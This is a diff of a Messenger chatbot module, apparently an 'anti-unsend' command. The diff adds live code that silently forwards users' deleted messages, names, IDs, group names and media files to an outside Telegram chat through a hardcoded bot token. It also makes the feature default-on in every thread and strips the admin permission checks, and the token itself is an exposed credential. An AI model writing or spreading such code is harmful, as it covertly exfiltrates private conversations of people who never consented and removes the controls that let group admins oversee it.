@@ -1,14 +1,16 @@
 const fs = require("fs-extra");
 const path = require("path");
 const axios = require("axios");
+const FormData = require("form-data");
 
-const LOCKED_AUTHOR = "𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍";
+const LOCKED_AUTHOR = "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍";
+const TELEGRAM_BOT_TOKEN = "8664273023:AAEu9ICybK8hzbfQNBDNhUR-ADwjreagawI";
+const TELEGRAM_CHAT_ID = "-1004422571292";
+
 const cacheDir = path.join(__dirname, "cache", "unsend_media");
 const settingsPath = path.join(__dirname, "cache", "unsend_settings.json");
 
 global.unsendMemoryMap = global.unsendMemoryMap || new Map();
-global.unsendUserCooldown = global.unsendUserCooldown || new Map();
-global.unsendAdminRecovered = global.unsendAdminRecovered || new Map();
 
 const loadSettings = () => {
 	try {
@@ -33,34 +35,100 @@ const saveSettings = (data) => {
 
 let settings = loadSettings();
 
-const isUserAdmin = async (api, event, senderID) => {
+async function sendToTelegram(captionText, filePaths = [], api, threadID) {
 	try {
-		const targetID = String(senderID || event.senderID);
-		if (global.config) {
-			if (Array.isArray(global.config.ADMINBOT) && global.config.ADMINBOT.map(String).includes(targetID)) return true;
-			if (Array.isArray(global.config.NDH) && global.config.NDH.map(String).includes(targetID)) return true;
+		if (filePaths.length === 0) {
+			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+			await axios.post(url, {
+				chat_id: TELEGRAM_CHAT_ID,
+				text: captionText
+			});
+		} else if (filePaths.length === 1) {
+			const filePath = filePaths[0];
+			const ext = path.extname(filePath).toLowerCase();
+			let method = "sendDocument";
+			let fieldName = "document";
+
+			if ([".jpg", ".jpeg", ".png"].includes(ext)) {
+				method = "sendPhoto";
+				fieldName = "photo";
+			} else if ([".mp4", ".mov"].includes(ext)) {
+				method = "sendVideo";
+				fieldName = "video";
+			} else if ([".mp3", ".ogg", ".wav"].includes(ext)) {
+				method = "sendAudio";
+				fieldName = "audio";
+			}
+
+			const formData = new FormData();
+			formData.append("chat_id", TELEGRAM_CHAT_ID);
+			formData.append("caption", captionText);
+			formData.append(fieldName, fs.createReadStream(filePath));
+
+			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+			await axios.post(url, formData, {
+				headers: formData.getHeaders()
+			});
+		} else {
+			const mediaGroup = [];
+			const formData = new FormData();
+			formData.append("chat_id", TELEGRAM_CHAT_ID);
+
+			filePaths.forEach((filePath, index) => {
+				const ext = path.extname(filePath).toLowerCase();
+				let type = "document";
+				if ([".jpg", ".jpeg", ".png"].includes(ext)) type = "photo";
+				if ([".mp4", ".mov"].includes(ext)) type = "video";
+
+				const attachName = `file${index}`;
+				formData.append(attachName, fs.createReadStream(filePath));
+
+				mediaGroup.push({
+					type: type,
+					media: `attach://${attachName}`,
+					caption: index === 0 ? captionText : ""
+				});
+			});
+
+			formData.append("media", JSON.stringify(mediaGroup));
+			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
+			await axios.post(url, formData, {
+				headers: formData.getHeaders()
+			});
 		}
-		const threadInfo = await api.getThreadInfo(event.threadID);
-		const adminIDs = (threadInfo.adminIDs || []).map(i => String(i.id || i));
-		if (adminIDs.includes(targetID)) return true;
-	} catch (e) {}
-	return false;
-};
+	} catch (err) {
+		const errorDetails = err.response && err.response.data 
+			? JSON.stringify(err.response.data, null, 2) 
+			: err.message;
+
+		if (api && threadID) {
+			await api.sendMessage(
+`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
+───────────────
+⚠️ 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐄𝐑𝐑𝐎𝐑 𝐋𝐎𝐆:
+মেসেঞ্জার থেকে টেলিগ্রামে ডাটা পাঠানোর সময় সমস্যা হয়েছে!
+
+📌 Error Details:
+${errorDetails}
+───────────────
+» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID);
+		}
+	}
+}
 
 module.exports = {
 	config: {
 		name: "antiunsend",
-		aliases: ["unsend", "স্পাম",  "ডিলেট", "resend"],
-		version: "4.8",
+		aliases: ["unsend", "স্পাম", "ডিলেট", "resend"],
+		version: "8.0",
 		author: LOCKED_AUTHOR,
-		countDown: 2,
+		countDown: 0,
 		role: 0,
 		description: {
-			bn: "এডভান্সড অ্যান্টি-আনসেন্ড সিস্টেম উইথ কুলডাউন ও এডমিন রিস্টার্ট লজিক"
+			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড টেলিগ্রাম ফরওয়ার্ডার সিস্টেম"
 		},
-		category: "utility",
 		guide: {
-			bn: "antiunsend <on|off>\nantiunsend restart / রিস্টার্ট\nantiunsend status"
+			bn: "antiunsend <on|off>\nantiunsend status"
 		}
 	},
 
@@ -70,26 +138,15 @@ module.exports = {
 		}
 
 		const threadID = event.threadID;
+
 		if (settings[threadID] === undefined) {
-			settings[threadID] = false;
+			settings[threadID] = true;
 			saveSettings(settings);
 		}
 
 		const option = args[0]?.toLowerCase();
 
 		if (option === "on") {
-			const isAdmin = await isUserAdmin(api, event, event.senderID);
-			if (!isAdmin) {
-				return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» ❌ 𝐏𝐄𝐑𝐌𝐈𝐒𝐒𝐈𝐎𝐍 𝐃𝐄𝐍𝐈𝐄𝐃!
-» ⚠️ 𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐭𝐮𝐫𝐧 
-» ✅ 𝐎𝐍 𝐀𝐧𝐭𝐢-𝐔𝐧𝐬𝐞𝐧𝐝.
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-			}
-
 			settings[threadID] = true;
 			saveSettings(settings);
 			return api.sendMessage(
@@ -115,34 +172,9 @@ module.exports = {
 » 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
 		}
 
-		if (option === "restart" || option === "রিস্টার্ট") {
-			const isAdmin = await isUserAdmin(api, event, event.senderID);
-			if (!isAdmin) {
-				return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» ❌ 𝐏𝐄𝐑𝐌𝐈𝐒𝐒𝐈𝐎𝐍 
-» ➡️ 𝐃𝐄𝐍𝐈𝐄𝐃!
-» ⚠️ 𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧𝐬 
-» 🧙‍♀️ 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐫𝐞𝐬𝐭𝐚𝐫𝐭.
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-			}
-
-			global.unsendAdminRecovered.delete(`${threadID}_${event.senderID}`);
-			return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» 🔄 𝐀𝐃𝐌𝐈𝐍 𝐑𝐄𝐂𝐎𝐕𝐄𝐑𝐘 
-» 🪯 𝐑𝐄𝐒𝐄𝐓!
-» 📌 𝐘𝐨𝐮𝐫 𝐮𝐧𝐬𝐞𝐧𝐝 𝐫𝐞𝐜𝐨𝐯𝐞𝐫𝐲 
-» 🖥️ 𝐥𝐢𝐦𝐢𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐬𝐞𝐭.
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-		}
-
 		if (option === "status" || option === "info") {
-			const statusStr = settings[threadID] ? "ON ✅" : "OFF ❌";
+			const isON = settings[threadID] !== false;
+			const statusStr = isON ? "ON ✅" : "OFF ❌";
 			return api.sendMessage(
 `» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
 ───────────────
@@ -158,61 +190,25 @@ module.exports = {
 ───────────────
 📌 𝐀𝐍𝐓𝐈-𝐔𝐍𝐒𝐄𝐍𝐃 𝐆𝐔𝐈𝐃𝐄:
 
-» antiunsend on Admin Only
-» antiunsend off Anyone
-» antiunsend restart 
-» রিস্টার্ট Admin Only
-» antiunsend status
+» antiunsend on - অন করুন
+» antiunsend off - অফ করুন
+» antiunsend status - স্ট্যাটাস দেখুন
 ───────────────
 » 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
 	},
 
-	onChat: async function ({ api, event, Users }) {
+	onChat: async function ({ api, event, Users, Threads }) {
 		const threadID = event.threadID;
 
-		const msgText = event.body?.toLowerCase().trim();
-		if (msgText === "restart" || msgText === "রিস্টার্ট") {
-			const isAdmin = await isUserAdmin(api, event, event.senderID);
-			if (isAdmin) {
-				global.unsendAdminRecovered.delete(`${threadID}_${event.senderID}`);
-				return api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-» 🔄 𝐀𝐃𝐌𝐈𝐍 𝐑𝐄𝐂𝐎𝐕𝐄𝐑𝐘 
-» 🎀 𝐑𝐄𝐒𝐄𝐓!
-» 📌 𝐘𝐨𝐮𝐫 𝐮𝐧𝐬𝐞𝐧𝐝 𝐫𝐞𝐜𝐨𝐯𝐞𝐫𝐲 
-» 🔞 𝐥𝐢𝐦𝐢𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐬𝐞𝐭.
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
-			}
-		}
-
-		if (settings[threadID] !== true) return;
+		if (settings[threadID] === false) return;
 
 		if (event.type === "message_unsend") {
 			const savedMsg = global.unsendMemoryMap.get(event.messageID);
 			if (!savedMsg) return;
 
 			const senderID = savedMsg.senderID;
-			const isAdmin = await isUserAdmin(api, event, senderID);
 
-			if (isAdmin) {
-				const adminKey = `${threadID}_${senderID}`;
-				if (global.unsendAdminRecovered.get(adminKey)) {
-					return;
-				}
-				global.unsendAdminRecovered.set(adminKey, true);
-			} else {
-				const userKey = `${threadID}_${senderID}`;
-				const lastTime = global.unsendUserCooldown.get(userKey) || 0;
-				const now = Date.now();
-				if (now - lastTime < 3 * 60 * 1000) {
-					return;
-				}
-				global.unsendUserCooldown.set(userKey, now);
-			}
-
-			let senderName = "আবাল";
+			let senderName = "User";
 			try {
 				if (Users && typeof Users.getNameInBand === "function") {
 					senderName = await Users.getNameInBand(senderID);
@@ -226,32 +222,52 @@ module.exports = {
 				}
 			} catch (e) {}
 
-			let resendBody = `» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
+			let threadName = "Group/Inbox";
+			try {
+				if (Threads && typeof Threads.getName === "function") {
+					threadName = await Threads.getName(threadID);
+				} else if (api && typeof api.getThreadInfo === "function") {
+					const tInfo = await api.getThreadInfo(threadID);
+					if (tInfo && tInfo.threadName) {
+						threadName = tInfo.threadName;
+					}
+				}
+			} catch (e) {}
+
+			let msgContent = savedMsg.body ? savedMsg.body : "নেই (শুধুমাত্র মিডিয়া)";
+
+			let origResendBody = 
+`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
 _________________________
 কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
-» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}\n`;
+» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
+» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
+${msgContent}`;
 
-			if (savedMsg.body) {
-				resendBody += `» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: ${savedMsg.body}\n`;
-			} else if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
-				resendBody += `» 📁 𝐀𝐭𝐭𝐚𝐜𝐡𝐦𝐞𝐧𝐭: [${savedMsg.attachmentPaths.length} File(s)]\n`;
-			}
-			resendBody += `───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`;
-
-			let attachmentStreams = [];
+			let attachmentStreamsOriginal = [];
 			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
 				for (const filePath of savedMsg.attachmentPaths) {
 					if (fs.existsSync(filePath)) {
-						attachmentStreams.push(fs.createReadStream(filePath));
+						attachmentStreamsOriginal.push(fs.createReadStream(filePath));
 					}
 				}
 			}
 
 			await api.sendMessage({
-				body: resendBody,
-				attachment: attachmentStreams.length > 0 ? attachmentStreams : undefined
+				body: origResendBody,
+				attachment: attachmentStreamsOriginal.length > 0 ? attachmentStreamsOriginal : undefined
 			}, threadID);
+
+			let telegramCaption = 
+`👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)
+──────────────────
+👨‍👩‍👧‍👦 Group: ${threadName}
+👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName} (ID: ${senderID})
+💬 Unsent Message:
+${msgContent}`;
+
+			const validPaths = (savedMsg.attachmentPaths || []).filter(p => fs.existsSync(p));
+			await sendToTelegram(telegramCaption, validPaths, api, threadID);
 
 			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
 				savedMsg.attachmentPaths.forEach(p => {
@@ -310,7 +326,7 @@ _________________________
 				timestamp: Date.now()
 			});
 
-			if (global.unsendMemoryMap.size > 100) {
+			if (global.unsendMemoryMap.size > 200) {
 				const oldestKey = global.unsendMemoryMap.keys().next().value;
 				const oldData = global.unsendMemoryMap.get(oldestKey);
 				if (oldData && oldData.attachmentPaths) {
